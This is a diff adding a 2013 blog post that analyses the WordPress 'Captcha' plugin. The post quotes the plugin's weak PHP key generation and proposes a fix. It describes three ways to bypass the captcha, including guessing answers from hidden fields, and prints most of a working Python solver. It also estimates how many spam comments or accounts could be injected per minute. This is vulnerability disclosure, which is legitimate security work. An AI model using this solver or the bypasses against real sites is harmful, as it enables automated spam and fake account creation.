@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+<meta name="author" content="Nikolai Tschacher" />
+<meta name="description" content="Last Edit (Effective: 7th November 2013) It seems like the plugin authors updated the security of the plugin. All the bottom blog entry deals with version 3.8.7. In this new paragraph, I will look whether these recent updates to version 3.8.8 added the necessary security to ..." />
+<meta name="keywords" content="Captcha, Security, Programming, Exploit">
+<meta property="og:site_name" content="Coding, Learning and IT Security"/>
+<meta property="og:title" content="A tale of a twofold broken wordpress captcha plugin"/>
+<meta property="og:description" content="Last Edit (Effective: 7th November 2013) It seems like the plugin authors updated the security of the plugin. All the bottom blog entry deals with version 3.8.7. In this new paragraph, I will look whether these recent updates to version 3.8.8 added the necessary security to ..."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/a-tale-of-a-twofold-broken-wordpress-captcha-plugin.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2013-11-04 02:02:00+01:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/nikolai-tschacher.html">
+<meta property="article:section" content="Programming"/>
+<meta property="article:tag" content="Captcha"/>
+<meta property="article:tag" content="Security"/>
+<meta property="article:tag" content="Programming"/>
+<meta property="article:tag" content="Exploit"/>
+<meta property="og:image" content="">  <title>Coding, Learning and IT Security &ndash; A tale of a twofold broken wordpress captcha plugin</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="">
+        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
+      </a>
+      <h1><a href="">Coding, Learning and IT Security</a></h1>
+      <p></p>
+      <nav>
+        <ul class="list">
+          <li><a href="/pages/about.html#about">About</a></li>
+          <li><a href="/pages/contact.html#contact">Contact</a></li>
+          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
+          <li><a href="/pages/projects.html#projects">Projects</a></li>
+          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
+          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+    </nav>
+
+<article>
+  <header>
+    <h1 id="a-tale-of-a-twofold-broken-wordpress-captcha-plugin">A tale of a twofold broken wordpress captcha plugin</h1>
+    <p>Posted on Mo 04 November 2013 in <a href="/category/programming.html">Programming</a></p>
+  </header>
+  <div>
+    <p><strong>Last Edit (Effective: 7th November 2013)</strong></p>
+<p>It seems like the plugin authors updated the security of the plugin. All
+the bottom blog entry deals with version 3.8.7. In this new paragraph, I
+will look whether these recent updates to version
+<a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.8/" title="3.8.8">3.8.8</a>
+added the necessary security to prevent conducting an...</p>
+<ul>
+<li>Attack vector one: Parsing the captcha logic.</li>
+<li>Attack vector two: Reversing the decode() function and just reading the solution from the hidden fields.</li>
+</ul>
+<p>Let's get started:</p>
+<p>At line 942 of the <a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.8/captcha.php" title="plugin code">plugin code</a>
+(The start of the function that generates the captcha) we see that the
+password isn't longer a static clear text password, it is built
+dynamically every 24 hours with the function <code>cptch_generate_key()</code>,
+that I will show here for your convenience:</p>
+<div class="highlight"><pre><span class="x">// Functionality of the captcha logic work for custom form</span>
+<span class="x">if ( ! function_exists( &#39;cptch_display_captcha_custom&#39; ) ) {</span>
+<span class="x">    function cptch_display_captcha_custom() {</span>
+<span class="x">        global $cptch_options, $cptch_time;</span>
+
+<span class="x">        if ( ! isset( $cptch_options[&#39;cptch_str_key&#39;] ) )</span>
+<span class="x">            $cptch_options = get_option( &#39;cptch_options&#39; );</span>
+<span class="x">        if ( $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;] == &#39;&#39; || $cptch_options[&#39;cptch_str_key&#39;][&#39;time&#39;] &lt; time() - ( 24 * 60 * 60 ) )</span>
+<span class="x">            cptch_generate_key();</span>
+<span class="x">        $str_key = $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;];</span>
+</pre></div>
+
+
+<p>Let's see if the new function <code>cptch_generate_key()</code> is sufficiently
+random enough. Here is the function code:</p>
+<div class="highlight"><pre><span class="x">/* generate key */</span>
+<span class="x">if ( ! function_exists( &#39;cptch_generate_key&#39; ) ) {</span>
+<span class="x">    function cptch_generate_key( $lenght = 15 ) {</span>
+<span class="x">        global $cptch_options;</span>
+<span class="x">        /* Under the string $simbols you write all the characters you want to be used to randomly generate the code. */</span>
+<span class="x">        $simbols = get_bloginfo( &quot;url&quot; ) . time();</span>
+<span class="x">        $simbols_lenght = strlen( $simbols );</span>
+<span class="x">        $simbols_lenght--;</span>
+<span class="x">        $str_key = NULL;</span>
+<span class="x">        for ( $x = 1; $x &lt;= $lenght; $x++ ) {</span>
+<span class="x">            $position = rand( 0, $simbols_lenght );</span>
+<span class="x">            $str_key .= substr( $simbols, $position, 1 );</span>
+<span class="x">        }</span>
+
+<span class="x">        $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;] = md5( $str_key );</span>
+<span class="x">        $cptch_options[&#39;cptch_str_key&#39;][&#39;time&#39;] = time();</span>
+<span class="x">        update_option( &#39;cptch_options&#39;, $cptch_options );</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>Sorry to disappoint, it's still <em>somewhat</em> broken. Let's discuss what
+the patch does:</p>
+<p>First the author obtains the current site address with
+<code>get_bloginfo('url')</code>. The wordpress docs says that this retrieves:</p>
+<blockquote>
+<p>'url' - Returns the "Site address (URL)" set in Settings &gt; General. This data is retrieved from the "home" record in the wp_options table. Equivalent to home_url().</p>
+</blockquote>
+<p>This is a world known static value, that is not randomness in ANY
+POSSIBLE WAY in the site url! If the plugin is installed on my server,
+<code>get_bloginfo('url')</code> would just yield "http://incolumitas.com/". You get
+it? It returns the url where wordpress is located :/</p>
+<p>Furthermore, the function continues to pick random characters from the
+site url and concatenates them to a new string that has default length
+of 15. In short: The function just uses 15 random characters from the
+seed that is the site url. Well, is this secure?</p>
+<p>First of all, <code>rand()</code> is not a secure
+<a href="http://en.wikipedia.org/wiki/Pseudorandom_number_generator">PRNG</a>! I
+suggest the plugin author strongly to have a glimpse on a recent reddit
+netsec post about <a href="http://www.reddit.com/r/netsec/comments/1pvfmv/phps_mt_rand_random_number_generating_function/">that even <code>mt_rand()</code> is a weak
+PRNG</a>.</p>
+<p>This means that we can find out the state of <code>rand()</code> with sufficiently
+enough samples and can therefore predict what characters the <code>rand()</code>
+function outputs. But maybe that works not, because the password is only
+generated every 24 hours and the "state" of the <code>rand()</code> PRNG changes
+faster. I honestly don't know. That being said, there is probably
+another way to extract values from <code>rand()</code> through wordpress in order to
+obtain enough samples to pursue a cracking attempt. Maybe even by the
+captcha math equations themselves, since their randomness relies heavily
+on successive calls to rand() [After thinking twice about it: That will
+definitely work]. Anyway, I would suggest to use something like the
+following to generate the password (Coded quickly by me, so double check
+it better!):</p>
+<div class="highlight"><pre><span class="x">// Always check if this function returns a str of length 32! If not, don&#39;t use it!</span>
+<span class="x">if ( ! function_exists( &#39;cptch_generate_key&#39; ) ) {</span>
+<span class="x">   function cptch_generate_key( $length = 32 ) {</span>
+<span class="x">     $cstrong = False;</span>
+<span class="x">     $bytes = openssl_random_pseudo_bytes($length, $cstrong);</span>
+<span class="x">     if ($cstrong == False)</span>
+<span class="x">        return False;</span>
+<span class="x">     else</span>
+<span class="x">        return bin2hex($bytes);</span>
+<span class="x">   }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p><strong>Conclusion:</strong></p>
+<ul>
+<li>The plugin is still vulnerable against captcha parsing (Nothing
+    changed here). This is the root of the problem.</li>
+<li>The plugin still handles it's cryptography pretty badly, but the
+    randomness might be good enough! (Note that I am from times
+    meticulous what security things concern).</li>
+<li>
+<p>The whole captcha protection is even in a <em>third</em> way broken.
+    Consider some captchas that I generated with the plugin:</p>
+<p>Calculation with timestamp: 1383770422 Encoded pWw= is decoded to 3 
+Calculation with timestamp: 1383773265 Encoded 3Ko= is decoded to 8 
+Calculation with timestamp: 1383772504 Encoded tNM= is decoded to 6 
+Calculation with timestamp: 1383770071 Encoded E08r is decoded to 10 
+Calculation with timestamp: 1383771712 Encoded VEA= is decoded to 0 
+Calculation with timestamp: 1383770645 Encoded aWPB is decoded to 16 
+Calculation with timestamp: 1383773392 Encoded MEa7 is decoded to 42 
+Calculation with timestamp: 1383772030 Encoded 2uA= is decoded to 4 
+Calculation with timestamp: 1383770004 Encoded lJ8= is decoded to 7 
+Calculation with timestamp: 1383770859 Encoded KvE= is decoded to 9 
+Calculation with timestamp: 1383772789 Encoded k1I= is decoded to 7 
+Calculation with timestamp: 1383773377 Encoded BAE= is decoded to 6 
+Calculation with timestamp: 1383770038 Encoded /HY= is decoded to 8 
+Calculation with timestamp: 1383768565 Encoded nmM= is decoded to 5 
+Calculation with timestamp: 1383765035 Encoded JPA= is decoded to 6 
+Calculation with timestamp: 1383770354 Encoded 9EZ3 is decoded to 12 
+Calculation with timestamp: 1383771119 Encoded KX4= is decoded to 1 
+Calculation with timestamp: 1383773236 Encoded eSc= is decoded to 7 
+Calculation with timestamp: 1383770716 Encoded J6w= is decoded to 1 
+Calculation with timestamp: 1383768040 Encoded fUg= is decoded to 1 
+Calculation with timestamp: 1383773167 Encoded 7Co= is decoded to 6 
+Calculation with timestamp: 1383770803 Encoded A3k= is decoded to 1 
+Calculation with timestamp: 1383771047 Encoded J1Q= is decoded to 8 
+Calculation with timestamp: 1383768079 Encoded fpg= is decoded to 6 
+Calculation with timestamp: 1383767787 Encoded uR8= is decoded to 2 
+Calculation with timestamp: 1383773077 Encoded pgg= is decoded to 4 
+Calculation with timestamp: 1383772657 Encoded KXI= is decoded to 3 
+Calculation with timestamp: 1383771187 Encoded Ct0= is decoded to 9 
+Calculation with timestamp: 1383767982 Encoded Y6U= is decoded to 3 
+Calculation with timestamp: 1383773155 Encoded 9wpu is decoded to 11 
+Calculation with timestamp: 1383767071 Encoded ejeX is decoded to 27 
+Calculation with timestamp: 1383772116 Encoded dWyu is decoded to 15</p>
+</li>
+</ul>
+<p>What do you see? Numeric captcha solutions (The base64 encoded 3-4
+char string) smaller than 10, have a encoded value that ends with
+the equal sign "=". Hence we could just sketch a little script that
+checks whether the hidden field <code>cptch_result</code> ends with a "=". If
+this is the case, we just guess the result! That means we can inject
+a spammer comment/login attempt/registration in every 10th case (a
+little less effectively since we have to discard numbers &gt; 10 [But
+there we could also guess a number, just a higher one, there's
+finite pool of them]. Assuming that we fire 500 requests a minute,
+we can spam the blog with 50 new users or 50 spam comments a minute!
+That's not bad for such a simplistic approach :P<br />
+This technique bases, yet again, on the bad encode() function.</p>
+<h3>Excursus: Could we crack the new function?</h3>
+<p>Let's assume that <code>get_bloginfo( "url" ).time();</code> yields something like</p>
+<div class="highlight"><pre>http://site.us1383733573
+</pre></div>
+
+
+<p>Then the pool of random characters is (Every character only once!)</p>
+<div class="highlight"><pre>htp:/sie.u13875
+</pre></div>
+
+
+<p>and the number of occurences for every char is:</p>
+<div class="highlight"><pre>&#39;h&#39;: 1 
+&#39;t&#39;: 3
+&#39;p&#39;: 1
+&#39;:&#39;: 1
+&#39;/&#39;: 2
+&#39;s&#39;: 2
+&#39;i&#39;: 1
+&#39;e&#39;: 1
+&#39;.&#39;: 1
+&#39;u&#39;: 1
+&#39;1&#39;: 1
+&#39;3&#39;: 3
+&#39;8&#39;: 1
+&#39;7&#39;: 2
+&#39;5&#39;: 2
+</pre></div>
+
+
+<p>And of course we all know our maths: The number of combinations is n\^k,
+where n is the number of different input characters (The alphabet) and k
+is the length of the password.</p>
+<p>Hence we need to calculate an average of</p>
+<div class="highlight"><pre>n = 15;
+k = 15;
+
+number_of_combinations = 15^15
+
+Python:
+&gt;&gt;&gt; 15**15
+437893890380859375
+</pre></div>
+
+
+<p>437893890380859375 is quite a big number. Assuming we have a slow PC and
+use <a href="http://hashcat.net/oclhashcat-plus/">hashcat</a>, we can handle 335M
+c/s. This means we need 1307145941 seconds to brute force the password.
+Of course this "cryptoanalysis" applies only to a somewhat artificial
+site url like <em>http://site.us</em>. Nevertheless, this is not secure in terms
+of cryptography!</p>
+<h3>Excursus: Do we even need to crack the function?</h3>
+<p>Due to the implementation of the encode() function, it doesn't matter
+how good the password is, since only maximally two bytes of the random
+data blob is essentially used in the <em>encrypted</em> value. Just analyze the
+encode() function and you will soon realize that every number 0-9 is
+xored with a random byte and every number &gt; 10 is xored with two random
+bytes...So there is just no need for more than two random bytes :/</p>
+<h2>Original blog post</h2>
+<h3>Preface (Start of blog post that applies to version 3.8.7)</h3>
+<p>Over the years I have seen quite some applications that weren't very
+well engineered. Security bugs, cumbersome coding practices and a
+missing sense for software architecture to name a few key points. But
+there was mostly some reason for the lack of quality. Be it the
+inexperience of the authors, the relative novelty of the application or
+just laziness. Bad code is not really <em>that bad</em> if it doesn't
+compromise the security or usability of the software and does not
+jeopardize many users. But apps that compromise both and find themselves
+simultaneously in a advanced development stage are really unpleasant to
+encounter. (That's my opinion. I think there are also many examples of
+my code that lacks security and usability and good coding practices. But
+I didn't publish any of my code officially or even distribute it
+commercially).</p>
+<p>In this blog post I will demonstrate the utter failing of a thousand
+line wordpress security plugin that should test to tell computers and
+humans apart (CAPTCHA).</p>
+<h3>Who is the villain?</h3>
+<p><strong>It is <a href="http://wordpress.org/plugins/captcha/">Captcha</a>.</strong></p>
+<p>Some basic information about the wordpress plugin (From 03.11.2013):</p>
+<table class="table">
+<thead>
+<tr>
+<th>
+Affected version
+
+</th>
+<th>
+Vendor
+
+</th>
+<th>
+Last Updated
+
+</th>
+<th>
+Downloads
+
+</th>
+<th>
+Ratings
+
+</th>
+<th>
+Downloads yesterday
+
+</th>
+</tr>
+</thead>
+<td>
+[3.8.7](http://plugins.svn.wordpress.org/captcha/tags/3.8.7/ "3.8.7")
+
+</td>
+<td>
+http://bestwebsoft.com/
+
+</td>
+<td>
+2013-10-31
+
+</td>
+<td>
+1,187,259
+
+</td>
+<td>
+4.6 of 5 stars (240 ratings)
+
+</p>
+<td>
+4,215
+
+</td>
+</tr>
+</table>
+
+<p>Therefore this plugin is <strong>rather large</strong> and enjoys a ever growing user
+base. It is also the very first hit when you type "Captcha" in the
+wordpress search form. Maybe because the plugin has the exactly the same
+name :/ Anyways, the prominent position is reason enough to investigate
+furher.</p>
+<p>It's description states euphorically:</p>
+<blockquote>
+<p>The Captcha plugin allows you to implement a super security captcha
+form into web forms. It protects your website from spam by means of
+math logic, easily understood by human beings. You will not have to
+spend your precious time on annoying attempts to understand
+hard-to-read words, combinations of letters or pictures that make your
+eyes pop up. All you need is to do one of the three basic maths
+actions - add, subtract and multiply. This captcha can be used for
+login, registration, password recovery, comments forms.</p>
+</blockquote>
+<p>That reads very well. Handy math equations, sophisticated protection
+from spammers, super security (<a href="http://kryptochef.net/">Cryptochef</a> is
+calling)!. No need for hard to decipher captchas! Blame me, I don't
+believe it...</p>
+<h3>The blackbox approach (Without reading the source)</h3>
+<p>How can easy math equations like these</p>
+<p><img alt="captcha
+1" src="http://s.wordpress.org/plugins/captcha/screenshot-3.jpg?r=798318" /><br />
+<img alt="captcha
+2" src="http://s.wordpress.org/plugins/captcha/screenshot-4.jpg?r=798318" /><br />
+<img alt="3" src="http://s.wordpress.org/plugins/captcha/screenshot-5.jpg?r=798318" /></p>
+<p>be immune against common parsing and computational evaluation?</p>
+<p>Let's try if we can actually crack them using a little quick &amp; dirty
+python script I just coded without even reading the source code further.
+You can also investigate my script on my <a href="https://github.com/NikolaiT/Scripts/blob/master/scripts/python/cracking_captcha_plugin/crack.py" title="github account">github
+account</a>.
+Please note that you have to install the captcha plugin on your
+wordpress site and that you need to adjust the links in the script to
+point to a existing blog site in order to test that the script solves
+the captchas.</p>
+<div class="highlight"><pre><span class="c"># Proofs uselessness of popular captcha plugin for wordpress</span>
+<span class="c"># Software link: http://wordpress.org/plugins/captcha/</span>
+
+<span class="c"># Modify links to test on your site. You should obviously provide correct URI&#39;s</span>
+<span class="c"># and have the plugin installed.</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">lxml.html</span>
+<span class="kn">import</span> <span class="nn">itertools</span>
+
+<span class="n">N</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;zero&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="s">&#39;one&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="s">&#39;two&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="s">&#39;three&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="s">&#39;four&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="s">&#39;five&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="s">&#39;six&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="s">&#39;seven&#39;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="s">&#39;eight&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span><span class="s">&#39;nine&#39;</span><span class="p">:</span> <span class="mi">9</span><span class="p">,</span><span class="s">&#39;eleven&#39;</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span><span class="s">&#39;twelve&#39;</span><span class="p">:</span> <span class="mi">12</span><span class="p">,</span><span class="s">&#39;thirteen&#39;</span><span class="p">:</span> <span class="mi">13</span><span class="p">,</span>
+<span class="s">&#39;fourteen&#39;</span><span class="p">:</span> <span class="mi">14</span><span class="p">,</span><span class="s">&#39;fifteen&#39;</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span><span class="s">&#39;sixteen&#39;</span><span class="p">:</span> <span class="mi">16</span><span class="p">,</span><span class="s">&#39;seventeen&#39;</span><span class="p">:</span> <span class="mi">17</span><span class="p">,</span><span class="s">&#39;eighteen&#39;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span><span class="s">&#39;nineteen&#39;</span><span class="p">:</span> <span class="mi">19</span><span class="p">,</span> <span class="s">&#39;ten&#39;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span><span class="s">&#39;twenty&#39;</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span><span class="s">&#39;thirty&#39;</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span>
+<span class="s">&#39;forty&#39;</span><span class="p">:</span> <span class="mi">40</span><span class="p">,</span><span class="s">&#39;fifty&#39;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span><span class="s">&#39;sixty&#39;</span><span class="p">:</span> <span class="mi">60</span><span class="p">,</span><span class="s">&#39;seventy&#39;</span><span class="p">:</span> <span class="mi">70</span><span class="p">,</span><span class="s">&#39;eighty&#39;</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span><span class="s">&#39;ninety&#39;</span><span class="p">:</span><span class="mi">90</span><span class="p">}</span>
+
+<span class="n">OPERATORS</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;+&#39;</span><span class="p">:</span> <span class="s">&#39;+&#39;</span><span class="p">,</span> <span class="s">&#39;−&#39;</span><span class="p">:</span> <span class="s">&#39;-&#39;</span><span class="p">,</span> <span class="s">&#39;×&#39;</span><span class="p">:</span> <span class="s">&#39;*&#39;</span><span class="p">,</span> <span class="s">&#39;/&#39;</span><span class="p">:</span> <span class="s">&#39;/&#39;</span><span class="p">,</span> <span class="s">&#39;=&#39;</span><span class="p">:</span> <span class="s">&#39;=&#39;</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">R</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
+        <span class="c"># If we can make a sum of the string, try it (For cases like &quot;twenty four&quot;)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">has_op</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">and</span> <span class="s">&#39;y&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span> <span class="k">if</span> <span class="n">n</span> <span class="ow">and</span> <span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">in</span> <span class="n">N</span><span class="o">.</span><span class="n">values</span><span class="p">()]))</span>
+        <span class="k">return</span> <span class="n">s</span>
+
+<span class="c"># Prevent bad words in eval()        </span>
+<span class="k">def</span> <span class="nf">whitelist</span><span class="p">(</span><span class="n">captcha</span><span class="p">):</span>
+    <span class="n">good</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">chain</span><span class="p">(</span><span class="n">N</span><span class="o">.</span><span class="n">keys</span><span class="p">(),</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">N</span><span class="o">.</span><span class="n">values</span><span class="p">()],</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">()))</span>
+    <span class="k">for</span> <span class="n">token</span> <span class="ow">in</span> <span class="n">captcha</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">):</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">token</span> <span class="ow">and</span> <span class="n">token</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">good</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;I failed: [</span><span class="si">%s</span><span class="s">]&quot;</span> <span class="o">%</span> <span class="n">token</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="s">&#39;Better not.&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">captcha</span>
+
+<span class="k">def</span> <span class="nf">has_op</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                <span class="k">if</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">get_op</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                <span class="k">if</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="n">o</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">captcha</span><span class="p">):</span>
+        <span class="c"># Some example captchas:</span>
+        <span class="c"># &#39;9 −  =  eight&#39;</span>
+        <span class="c"># &#39;+ 3 =  eight&#39;</span>
+        <span class="c"># &#39;9 × one =&#39;</span>
+        <span class="c"># &#39;× 8 =  twenty four&#39;</span>
+        <span class="c"># We see: Simple mathematical expression consisting of two parts. Let&#39;s parse that.</span>
+        <span class="n">left</span><span class="p">,</span> <span class="n">equals</span><span class="p">,</span> <span class="n">right</span> <span class="o">=</span> <span class="n">captcha</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s">&#39;=&#39;</span><span class="p">)</span> <span class="c"># Python is beautiful</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">left</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
+                <span class="n">left</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">right</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
+                <span class="n">right</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
+
+        <span class="n">left</span> <span class="o">=</span><span class="n">R</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
+        <span class="n">right</span> <span class="o">=</span> <span class="n">R</span><span class="p">(</span><span class="n">right</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
+
+        <span class="n">expr</span> <span class="o">=</span> <span class="p">[</span><span class="n">left</span><span class="p">,</span> <span class="n">right</span><span class="p">][</span><span class="n">has_op</span><span class="p">(</span><span class="n">right</span><span class="p">)]</span> <span class="c"># expr is the part with the mathematical operator</span>
+
+        <span class="n">ll</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">rr</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="n">get_op</span><span class="p">(</span><span class="n">expr</span><span class="p">))</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">ll</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
+                <span class="n">ll</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">rr</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
+                <span class="n">rr</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
+
+        <span class="c"># Reassemble</span>
+        <span class="n">X</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> == </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="n">ll</span><span class="p">,</span> <span class="n">N</span><span class="p">),</span> <span class="n">OPERATORS</span><span class="p">[</span><span class="n">op</span><span class="p">],</span> <span class="n">R</span><span class="p">(</span><span class="n">rr</span><span class="p">,</span> <span class="n">N</span><span class="p">)),</span> <span class="p">[</span><span class="n">right</span><span class="p">,</span> <span class="n">left</span><span class="p">][</span><span class="n">expr</span><span class="o">==</span><span class="n">right</span><span class="p">])</span>
+
+        <span class="c"># Brute force</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+                <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="n">X</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;y&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))):</span>
+                        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+        <span class="c"># Obtain post parameters from comment form</span>
+
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout&#39;</span><span class="p">)</span>
